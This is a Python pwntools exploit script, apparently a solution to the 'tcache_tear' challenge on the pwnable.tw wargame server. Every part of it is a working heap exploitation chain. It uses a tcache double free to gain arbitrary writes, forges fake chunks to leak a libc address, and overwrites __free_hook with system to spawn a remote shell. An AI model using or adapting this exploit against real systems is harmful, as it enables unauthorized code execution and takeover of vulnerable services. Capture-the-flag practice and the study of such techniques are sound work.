import pwn

elf = pwn.ELF('./tcache_tear_patched')
libc = pwn.ELF('./libc_ctf.so.6')
IS_LOCAL = False
if IS_LOCAL:
    p = pwn.process('./tcache_tear_patched')
else:
    p = pwn.remote('chall.pwnable.tw', 10207)

def input_name(name):
    p.sendlineafter(b'Name:', name)

def allocate(size, data):
    global p
    p.sendlineafter(b'Your choice :', b'1')
    p.recvuntil(b'Size:')
    p.send(str(size))
    p.sendlineafter(b'Data:', data)

def free():
    global p
    p.recv
    p.sendlineafter(b'Your choice :', b'2')

def arbitrary_write(address, data, size):
    allocate(size, b'DUMP')
    free()
    free()
    allocate(size, address)
    allocate(size, b'DUMP')
    allocate(size, data)
    

input_name(b'Test')
fake_chunk = pwn.p64(0)               # 0x602050 Size of previous chunk
fake_chunk += pwn.p64(0x501)      # 0x602058 Size of chunk
fake_chunk += pwn.p64(0)              # 0x602060 FD
fake_chunk += pwn.p64(0)              # 0x602068 BK
fake_chunk += pwn.p64(0)*3            # 0x602070-0x602080 Empty space
fake_chunk += pwn.p64(0x602060)         # CHUNK

sec_chunk = pwn.p64(0)                # 0x602550
sec_chunk += pwn.p64(0x21)        # 0x602558
sec_chunk += pwn.p64(0)*3            # 0x602560-0x602570 FD, BK, Empty
sec_chunk += pwn.p64(0x21)
arbitrary_write(pwn.p64(0x602550), sec_chunk, 0x70)
arbitrary_write(pwn.p64(0x602050), fake_chunk, 0x60)
free()
p.sendlineafter(b'Your choice :', b'3')
p.recvuntil(b'Name :')
leaked_addr = p.recv(8)
leaked_addr = pwn.u64(leaked_addr)
print("[+] Leaked address: ", hex(leaked_addr))
libc.address = leaked_addr - 0x3ebca0
print("[+] Libc base: ", hex(libc.address))
arbitrary_write(pwn.p64(libc.symbols['__free_hook']), pwn.p64(libc.symbols['system']), 0x50)
allocate(0x50, b'/bin/sh\x00')
free()
p.interactive()
